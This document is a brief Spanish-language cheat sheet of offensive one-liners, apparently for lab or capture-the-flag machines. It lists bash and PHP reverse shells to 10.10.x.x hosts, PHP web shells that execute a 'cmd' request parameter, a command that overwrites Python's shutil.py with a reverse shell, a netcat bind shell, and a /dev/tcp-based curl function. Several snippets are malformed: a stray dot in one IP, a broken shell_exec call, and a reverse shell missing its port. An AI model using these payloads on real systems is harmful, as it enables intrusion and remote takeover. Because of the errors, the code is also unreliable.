### Oneliner Bash
```css
bash -c 'exec bash -i &>/dev/tcp/10.10.10.10./9001 <&1'
```

### Oneliner cmd desde url
```css
<?php 
        echo "<pre>" . shell_exec($_REQUEST['cmd']>
?>
```

### Oneliner php
```python
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.8/7890 0>&1'");
```

### Oneliner php
```python
<?php
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.85/443 0>&1'")
?>
```

### Oneliner php

```python
<?php
 echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
 ?>
```

### Oneliner python
```python
echo "import os; os.system(\"bash -c 'bash -i >& /dev/tcp/10.8.203.6 0>&1'\")" > /usr/lib/python3.8/shutil.py
```

### Blind Shell
```python
# Maquina Victima

nc -nlvp 4646 -e /bin/bash
---------------------------------------------------------------------------------------------------

# Maquina Atacante

nc IPvictima 4646

```

### Función curl

```python
function __curl() {
  read -r proto server path <<<"$(printf '%s' "${1//// }")"
  if [ "$proto" != "http:" ]; then
    printf >&2 "sorry, %s supports only http\n" "${FUNCNAME[0]}"
    return 1
  fi
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [ "${HOST}" = "${PORT}" ] && PORT=80

  exec 3<>"/dev/tcp/${HOST}/$PORT"
  printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3
  (while read -r line; do
   [ "$line" = $'\r' ] && break
  done && cat) <&3
  exec 3>&-
}
```